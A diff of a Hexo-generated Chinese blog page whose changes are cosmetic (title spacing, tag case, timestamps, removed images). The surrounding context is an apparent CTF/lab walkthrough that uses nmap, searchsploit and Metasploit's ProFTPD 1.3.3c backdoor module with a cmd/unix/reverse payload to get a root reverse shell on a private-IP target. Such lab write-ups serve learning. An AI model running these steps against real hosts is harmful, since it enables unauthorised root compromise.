@@ -25,18 +25,12 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="FTP服务后门利用1. 信息探测12nmap -sV IP # 扫描主机服务信息以及服务版本namp -A -v -T4 IP # 最大线程扫描主机所有信息  发现FTP服务&#x3D;&#x3D;（端口号为21）&#x3D;&#x3D; 记录FTP软件名以及版本号 2. 漏洞利用1.漏洞查找1.1SearchSploit”漏洞查找工具 “SearchSploit”是一个用于Exploit-DB的">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/1.png">
-<meta property="og:image" content="http://example.com/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/2.png">
-<meta property="og:image" content="http://example.com/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/3.png">
-<meta property="og:image" content="http://example.com/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/4.png">
-<meta property="og:image" content="http://example.com/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/5.png">
 <meta property="article:published_time" content="2024-09-11T10:18:55.000Z">
-<meta property="article:modified_time" content="2024-09-11T11:06:17.805Z">
+<meta property="article:modified_time" content="2024-09-11T14:05:14.516Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="FTP">
-<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/1.png">
     
     
         <!-- Google tag (gtag.js) -->
@@ -60,7 +54,7 @@
         
             FTP服务后门利用 -
         
-        Dunm1e&#39;World
+        Dunm1e &#39; World
     </title>
 
     
@@ -100,7 +94,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["Lv1","Lv2","Lv3","Lv4","Lv5","Lv6","Lv7","Lv8","Lv9","Lv10"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐文章","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"Welcome to Dunm1e'World!"},"open_graph":true,"google_analytics":{"enable":true,"id":"G-B18L9QTZ0H"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/light.jpg","dark":"/images/dark.jpg"},"title":"Dunm1e'World","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/dunm1e","instagram":null,"zhihu":null,"twitter":null,"email":"dunxiongdun@gmail.com"},"qrs":{"weixin":"/images/wechat.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Github":{"path":"https://github.com/dunm1e","icon":"fa-brands fa-github"},"Links":{"icon":"fa-regular fa-link","submenus":{"Categories":"/categories","Tags":"/tags","Friends":"/links"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"有疑问请联系我的邮箱","show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/9/11 12:00:00"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["Lv1","Lv2","Lv3","Lv4","Lv5","Lv6","Lv7","Lv8","Lv9","Lv10"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐文章","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"Welcome to Dunm1e ' World!"},"open_graph":true,"google_analytics":{"enable":true,"id":"G-B18L9QTZ0H"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/light.jpg","dark":"/images/dark.jpg"},"title":"Dunm1e ' World","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/dunm1e","instagram":null,"zhihu":null,"twitter":null,"email":"dunxiongdun@gmail.com"},"qrs":{"weixin":"/images/wechat.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Github":{"path":"https://github.com/dunm1e","icon":"fa-brands fa-github"},"Links":{"icon":"fa-regular fa-link","submenus":{"Categories":"/categories","Tags":"/tags","Friends":"/links"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"有疑问请联系我的邮箱","show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/9/11 12:00:00"};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -210,7 +204,7 @@
 
 <div class="preloader">
     <h2 class="ml13">
-        Welcome to Dunm1e&#39;World!
+        Welcome to Dunm1e &#39; World!
     </h2>
     <script>
         var textWrapper = document.querySelector('.ml13');
@@ -301,7 +295,7 @@
             
             <a class="logo-title" href="/">
                 
-                Dunm1e&#39;World
+                Dunm1e &#39; World
                 
             </a>
         </div>
@@ -556,8 +550,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-11 19:06:17</span>
-            <span class="mobile">2024-09-11 19:06:17</span>
+            <span class="desktop">2024-09-11 22:05:14</span>
+            <span class="mobile">2024-09-11 22:05:14</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -599,7 +593,7 @@
                     </li>
                 
                     <li>
-                        | <a href="/tags/ctf/">ctf</a>&nbsp;
+                        | <a href="/tags/CTF/">CTF</a>&nbsp;
                     </li>
                 
             </ul>
@@ -643,49 +637,19 @@
 <h4 id="1-2查找漏洞"><a href="#1-2查找漏洞" class="headerlink" title="1.2查找漏洞"></a>1.2查找漏洞</h4><p>FTP服务为“<strong>ProFTPD 1.3.3c</strong>”版本</p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit ProFTPD 1.3.3c</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/1.png"
-                      alt="图片"
-                ></p>
 <p>发现存在后门，可以尝试远程溢出。既可以通过修改对应文件中的源代码（修改某些参数）进而执行远程溢出从而利用漏洞（第一行，此方法较复杂），也可以使用Metasploit工具利用该漏洞（输出结果的第二行表示Metasploit工具已集成该漏洞）。</p>
 <p><strong>我们使用第二种方法</strong></p>
 <h3 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h3><p><strong>利用Metasploit进行远程溢出攻击</strong></p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  //启动Metasploit工具</span><br><span class="line">msf6 &gt; search ProFTPd-1.3.3c  //Metasploit中通过版本号查找该漏洞</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/2.png"
-                      alt="图片"
-                ></p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/unix/ftp/proftpd_133c_backdoor  //利用exp</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show payloads  //查看可使用的挂载</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> payload cmd/unix/reverse  //选择挂载</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/3.png"
-                      alt="图片"
-                ></p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数（输入时可用tab键补全）</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/4.png"
-                      alt="图片"
-                ></p>
 <div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> rhost 192.168.43.174  //设置靶机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; <span class="built_in">set</span> lhost 192.168.43.40  //设置攻击机ip</span><br><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; show options  //显示参数</span><br></pre></td></tr></table></figure></div>
 
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(unix/ftp/proftpd_133c_backdoor) &gt; exploit  //开始利用漏洞</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/FTP%E6%9C%8D%E5%8A%A1%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8/5.png"
-                      alt="图片"
-                ></p>
 <p>成功拿到反弹shell，且当前账户拥有root权限。（注：最后一句提示“Command shell session 1 opened”说明会话已经开启，并且下面出现光标，此时即可输入指令。）<br><strong>但是此会话跟终端有区别，于是我们优化终端</strong></p>
 <div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span>  //优化终端</span><br></pre></td></tr></table></figure></div>
 
@@ -707,7 +671,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-11 19:06:17
+                    :</strong> 2024-09-11 22:05:14
             </li>
         
         <li>
@@ -737,7 +701,7 @@
                     </li>
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/ctf/">#ctf</a>&nbsp;
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
                     </li>
                 
             </ul>
